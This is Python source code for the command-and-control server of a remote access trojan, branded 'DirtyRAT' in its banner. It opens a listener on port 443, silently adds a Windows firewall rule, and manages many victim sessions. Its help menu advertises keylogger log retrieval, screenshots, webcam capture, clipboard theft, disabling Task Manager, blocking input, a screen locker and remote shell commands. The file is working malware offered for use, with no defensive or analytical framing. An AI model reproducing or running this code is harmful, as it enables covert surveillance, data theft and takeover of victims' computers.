import socket
import struct
import threading
import subprocess
import platform
import os
import time
import datetime
import sys


active_clients = {}
session_counter = 0
session_lock = threading.Lock() 

def open_firewall_port(port):
    if platform.system() == "Windows":
        try:
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "add", "rule",
                 "name=RAT_Listener", "dir=in", "action=allow",
                 "protocol=TCP", f"localport={port}"],
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW 
            )
            print(f"[+] Firewall rule opened for port {port}")
        except:
            print("[-] Could not open firewall. Try running as Administrator.")

class PlainSocket:
    def __init__(self, conn):
        self.conn = conn

    def send(self, data: bytes):
        length = struct.pack("!I", len(data))
        self.conn.sendall(length + data)

    def receive(self):
        try:
            length_data = self.conn.recv(4)
            if not length_data:
                return None
            length = struct.unpack("!I", length_data)[0]
            data = b""
            while len(data) < length:
                packet = self.conn.recv(length - len(data))
                if not packet:
                    return None
                data += packet
            return data
        except socket.error as e: 

            return None
        except Exception as e:

            return None

class RATServer:
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        self.server.bind(("0.0.0.0", 443))
        open_firewall_port(443)
        self.server.listen(5)
        print("[+] Server running on port 443...")
        self.current_client_id = None 

    def handle_client(self, conn, addr, client_id):
        global active_clients, session_lock
        print(f"[+] Connection from {addr} assigned ID {client_id}")
        plain = PlainSocket(conn)

        with session_lock:
            active_clients[client_id] = (plain, addr)


        while True:
            try:

                time.sleep(1) # Small delay to prevent busy-waiting

            except (ConnectionResetError, BrokenPipeError, socket.error):
                print(f"[-] Client {client_id} ({addr}) disconnected.")
                break
            except Exception as e:
                print(f"[-] Unexpected Error with client {client_id} ({addr}): {e}")
                break
        
        with session_lock:
            if client_id in active_clients:
                del active_clients[client_id]
        conn.close()
        if self.current_client_id == client_id:
            self.current_client_id = None
            print("[!] Current session disconnected. Please select a new client.")


    def process_client_response(self, data):
        if data.startswith(b"TYPE:SCREENSHOT"):
            os.makedirs("screenshots", exist_ok=True)
            filename = f"screenshots/screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            image_data = data[len(b"TYPE:SCREENSHOT"):]
            with open(filename, "wb") as f:
                f.write(image_data)
            print(f"[+] Screenshot saved as {filename}")

        elif data.startswith(b"TYPE:CAMERA"):
            os.makedirs("camera_snaps", exist_ok=True)
            filename = f"camera_snaps/camera_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            image_data = data[len(b"TYPE:CAMERA"):]
            with open(filename, "wb") as f:
                f.write(image_data)
            print(f"[+] Camera snapshot saved as {filename}")

        elif data.startswith(b"TYPE:TEXT"):
            try:
                text = data[len(b"TYPE:TEXT"):].decode(errors="ignore")
                print(text)
            except UnicodeDecodeError:
                print("[!] Failed to decode text response.")

        else:
            os.makedirs("unknown", exist_ok=True)
            filename = f"unknown/raw_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
            with open(filename, "wb") as f:
                f.write(data)
            print(f"[!] Received unknown data. Saved as {filename}")

    def run_shell(self):
        global active_clients, session_lock

        while True:
            try:
                if self.current_client_id is None:
                    prompt = "rat> "
                else:
                    with session_lock:
                        if self.current_client_id in active_clients:
                            _plain, addr = active_clients[self.current_client_id]
                            prompt = f"rat@{addr[0]}:{self.current_client_id}> "
                        else:
                            
                            self.current_client_id = None
                            prompt = "rat> "

                cmd = input(prompt).strip()

                
                if not cmd: 
                    continue
                

                if cmd == "help":
                    print("Commands:")
                    print("  sessions              - List all active client sessions.")
                    print("  select <ID>           - Select a client session to interact with.")
                    print("  back                  - Go back to session selection (deselects current client).")
                    print("  exit                  - Exit the server.")
                    if self.current_client_id is not None:
                        print("\nClient-specific commands (after selecting a client):")
                        print("  help                  - Show client commands (e.g., get_logs, screenshot, shell <cmd>)")
                        print("  get_logs              - Retrieve keylogger logs from the client.")
                        print("  screenshot            - Capture a screenshot from the client.")
                        print("  camera                - Capture a camera snapshot from the client.")
                        print("  clipboard             - Get clipboard content from the client.")
                        print("  disable_taskmgr       - Disable Task Manager on the client.")
                        print("  block_input           - Block keyboard and mouse input on the client.")
                        print("  unblock_input         - Unblock keyboard and mouse input on the client.")
                        print("  screen_lock           - Activate a screen locker on the client.")
                        print("  screen_unlock         - Deactivate the screen locker on the client.")
                        print("  shell <cmd>           - Execute a shell command on the client.")
                        print("  system_info           - Get system information from the client.")
                        print("  list_processes        - List running processes on the client.")
                        print("  kill_process <pid>    - Kill a process by PID on the client.")
                    continue

                elif cmd == "sessions":
                    with session_lock:
                        if not active_clients:
                            print("[-] No active sessions.")
                        else:
                            print("\nActive Sessions:")
                            print("ID\tIP Address:Port")
                            print("--\t----------------")
                            for client_id, (_plain, addr) in active_clients.items():
                                print(f"{client_id}\t{addr[0]}:{addr[1]}")
                            print("----------------\n")
                    continue

                elif cmd.startswith("select "):
                    try:
                        selected_id = int(cmd.split(" ", 1)[1])
                        with session_lock:
                            if selected_id in active_clients:
                                self.current_client_id = selected_id
                                _plain, addr = active_clients[selected_id]
                                print(f"[+] Selected client {selected_id} ({addr[0]}:{addr[1]})")
                            else:
                                print(f"[-] Session ID {selected_id} not found.")
                    except ValueError:
                        print("[-] Invalid session ID. Usage: select <ID>")
                    continue

                elif cmd == "back":
                    if self.current_client_id is not None:
                        print(f"[+] Deselected client {self.current_client_id}.")
                        self.current_client_id = None
                    else:
                        print("[-] No client currently selected.")
                    continue

                elif cmd == "exit":
                    print("[!] Exiting server...")
                    with session_lock:
                        for _id, (plain, _addr) in active_clients.items():
                            try:
                                plain.conn.close() # Close client sockets
                            except:
                                pass
                    self.server.close()
                    sys.exit(0)

                if self.current_client_id is None:
                    print("[-] Please select a client first using 'select <ID>' or 'help'.")
                    continue

                # If a client is selected, send the command
                with session_lock:
                    if self.current_client_id not in active_clients:
                        print(f"[-] Selected client {self.current_client_id} disconnected. Please select another.")
                        self.current_client_id = None
                        continue
                    
                    plain, _addr = active_clients[self.current_client_id]

                try:
                    plain.send(cmd.encode())
                    data = plain.receive()
                    if data:
                        self.process_client_response(data)
                    else:
                        print("[-] No response from client (possibly disconnected).")
                        with session_lock:
                            if self.current_client_id in active_clients:
                                del active_clients[self.current_client_id]
                        self.current_client_id = None # Deselect the disconnected client
                        print("[!] Current session disconnected. Please select a new client.")

                except (ConnectionResetError, BrokenPipeError, socket.error):
                    print(f"[-] Client {self.current_client_id} disconnected.")
                    with session_lock:
                        if self.current_client_id in active_clients:
                            del active_clients[self.current_client_id]
                    self.current_client_id = None
                    print("[!] Current session disconnected. Please select a new client.")
                except Exception as e:
                    print(f"[-] Error communicating with client {self.current_client_id}: {e}")
                    with session_lock:
                        if self.current_client_id in active_clients:
                            del active_clients[self.current_client_id]
                    self.current_client_id = None
                    print("[!] Current session disconnected. Please select a new client.")

            except KeyboardInterrupt:
                print("\n[!] Server interrupted by user (Ctrl+C). Type 'exit' to quit.")
            except Exception as e:
                print(f"[-] An unexpected error occurred in the main shell loop: {e}")

    def run(self):
        # Start a thread to accept new client connections
        accept_thread = threading.Thread(target=self._accept_connections, daemon=True)
        accept_thread.start()

        # Run the interactive shell in the main thread
        self.run_shell()

    def _accept_connections(self):
        global session_counter, session_lock
        while True:
            try:
                conn, addr = self.server.accept()
                with session_lock:
                    session_counter += 1
                    client_id = session_counter
                thread = threading.Thread(target=self.handle_client, args=(conn, addr, client_id))
                thread.daemon = True # Allow the main program to exit even if threads are running
                thread.start()
            except socket.error as e:
                print(f"[-] Server accept error: {e}")
                
                break
            except Exception as e:
                print(f"[-] Error accepting connection: {e}")
                time.sleep(1) 


if __name__ == "__main__":
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    RESET = "\033[0m"

    ascii_art = f"""
{GREEN}
 ██████████    ███             █████               ███████████              █████   
░░███░░░░███  ░░░             ░░███               ░░███░░░░░███            ░░███    
 ░███   ░░███ ████  ████████  ███████   █████ ████ ░███    ░███   ██████   ███████  
 ░███    ░███░░███ ░░███░░███░░░███░   ░░███ ░███  ░██████████   ░░░░░███ ░░░███░   
 ░███    ░███ ░███  ░███ ░░░   ░███     ░███ ░███  ░███░░░░░███   ███████   ░███    
 ░███    ███  ░███  ░███       ░███ ███ ░███ ░███  ░███    ░███  ███░░███   ░███ ███
 ██████████   █████ █████      ░░█████  ░░███████  █████   █████░░████████  ░░█████ 
░░░░░░░░░░   ░░░░░ ░░░░░        ░░░░░    ░░░░░███ ░░░░░   ░░░░░  ░░░░░░░░    ░░░░░  
                                         ███ ░███                                   
                                        ░░██████                                    
                                         ░░░░░░                                     
{RESET}
{CYAN}------------------------------------------------------------------{RESET}
{YELLOW}  [+] Initializing DirtyRAT Server... Standby for incoming connections.{RESET}
{CYAN}------------------------------------------------------------------{RESET}
"""
    print(ascii_art)

    RATServer().run()